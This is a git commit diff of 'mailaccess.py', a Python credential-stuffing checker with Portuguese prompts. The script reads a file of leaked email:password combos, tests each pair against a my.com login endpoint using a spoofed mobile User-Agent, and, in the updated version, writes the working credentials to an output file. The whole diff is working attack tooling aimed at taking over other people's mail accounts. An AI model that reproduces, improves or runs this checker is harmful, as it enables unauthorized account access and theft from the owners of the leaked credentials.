49d57ac79064c9794d89dd1d52a572014baa4580
p0isonBR <65384918+p0isonBR@users.noreply.github.com>
2020-11-13 19:37:02 -0300

    Update mailaccess.py

--- mailaccess.py
+++ mailaccess.py
@@ -1,7 +1,7 @@
 import requests, time, os
 
 R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; Y='\033[1;33m'; G='\033[1;32m'; RT='\033[;0m'
-EG=f'{C}[{G}!{C}]'; MG=f'{C}[{G}+{C}]'; MR=f'{C}[{R}-{C}]'; AG=f'{C}[{G}*{C}]'; IG=f'{C}[{G}i{C}]'
+EG=f'{C}[{G}!{C}]'; MG=f'{C}[{G}+{C}]'; MR=f'{C}[{R}-{C}]'; AG=f'{C}[{G}*{C}]'; IB=f'{C}[{B}i{C}]'
 
 os.system('git pull && clear')
 
@@ -47,36 +47,57 @@ print(f'''{C}
 
 os.system('clear')
 
-print(f'''{B}*By PoisonBR
+print(f'''{G}*By PoisonBR                                                 {G}v1.0
 {B}███╗   ███╗ █████╗ ██╗██╗     {C} █████╗  ██████╗ ██████╗███████╗███████╗███████╗
 {B}████╗ ████║██╔══██╗██║██║     {C}██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝
 {B}██╔████╔██║███████║██║██║     {C}███████║██║     ██║     █████╗  ███████╗███████╗
 {B}██║╚██╔╝██║██╔══██║██║██║     {C}██╔══██║██║     ██║     ██╔══╝  ╚════██║╚════██║
 {B}██║ ╚═╝ ██║██║  ██║██║███████╗{C}██║  ██║╚██████╗╚██████╗███████╗███████║███████║
-{B}╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝{C}╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝ {G}v1.0{C}
+{B}╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝{C}╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝
+{IB} Não funcional em grandes dominios (ex gmail), por fatores de segurança adicional.
 ''')
 
-db=open(input(f'{MG}Indique o caminho do arquivo: {B}'), 'r').read().splitlines()
-print(G+str(len(db))+C+' e-mails no arquivo.'); time.sleep(3)
-print(f'{AG}Testando credenciais, aguarde...')
+db=open(input(f'{MG} Indique o caminho do arquivo: {B}'), 'r').read().splitlines()
+print(IB+' '+G+str(len(db))+C+' e-mails no arquivo.'); time.sleep(3)
+print()
+txt=input(f'{EB} IDefina o nome do novo arquivo de saida:{B} ')
+print()
+print(f'''{AG} Testando credenciais, aguarde...
+''')
 ldb=len(db)
 
-def checker(email, senha, c, ldb):
+def checker(email, senha, c, v, ldb, txt):
     acesso=requests.get('https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login='+email+'&Password='+senha, headers={'User-Agent': 'MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0'}).text
     if ('Ok=1') in acesso:
+        v=v+1
         print(f'{EG}{G}Credenciais válidas: {C}'+combo)
-        print(f'{IG}E-mails verificados: {G}'+str(c)+C+', e-mails restantes: '+G+str(ldb-c)+C)
+        print(f'{IB}E-mails verificados: {G}'+str(c)+C+', e-mails restantes: '+G+str(ldb-c)+C)
+        with open(txt+'.txt', 'a+') as chk:
+          chk.seek(0)
+          line=chk.read(150)
+          if len(line) > 0:
+            chk.write("\n")
+          chk.write(email+':'+senha)
+        print()
+        
+v=0
 c=0        
 for combo in db:
   if (':') in combo:
     email=combo.split(':')[0]
     senha=combo.split(':')[1]
     c=c+1
-    checker(email, senha, c, ldb)
+    checker(email, senha, c, v, ldb, txt)
   elif ('|') in combo:
     email=combo.split('|')[0]
     senha=combo.split('|')[1]
     c=c+1
-    checker(email, senha, c, ldb)
+    checker(email, senha, c, v, ldb, txt)
   else:
-    print('Combo inválido: '+combo)
+    print(f'{MR}Combo inválido: '+R+combo+C)
+print(f'{IB} Operação finalizada: '+B+str(ldb)+' e-mails verificados; '+G+str(v)+C+' credenciais válidas.')
+print()
+print(f'{MG} Arquivo salvo em: '+B+txt+'.txt'); time.sleep(2)
+print()
+print(f'''{C}Me acompanhe no Github: {G}https://github.com/p0isonBR
+{C}''')
